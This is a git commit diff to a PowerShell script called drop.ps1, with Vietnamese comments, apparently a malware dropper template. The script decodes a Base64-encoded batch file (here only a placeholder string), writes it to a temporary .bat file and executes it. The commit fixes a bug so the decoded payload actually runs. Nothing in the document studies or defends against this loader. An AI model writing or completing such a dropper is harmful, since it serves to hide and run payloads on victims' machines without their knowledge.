1b32be83e76fbb1a06b7696eec659fb02d482de3
43a1723 <hai1723notgay@gmail.com>
2024-06-30 20:07:00 +0700

    Update drop.ps1

--- file/drop/drop.ps1
+++ file/drop/drop.ps1
@@ -1,4 +1,11 @@
+# Giải mã chuỗi Base64 để lấy nội dung của tệp .bat
 $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("batcodeinhere="))
+
+# Tạo một tệp .bat tạm thời
 $tempBatFile = [System.IO.Path]::GetTempFileName() + ".bat"
-Set-Content -Path $tempBatFile -Value $batContent
+
+# Ghi nội dung đã giải mã vào tệp tạm thời
+Set-Content -Path $tempBatFile -Value $code
+
+# Chạy tệp .bat và chờ cho nó hoàn thành
 Start-Process -FilePath $tempBatFile -NoNewWindow -Wait
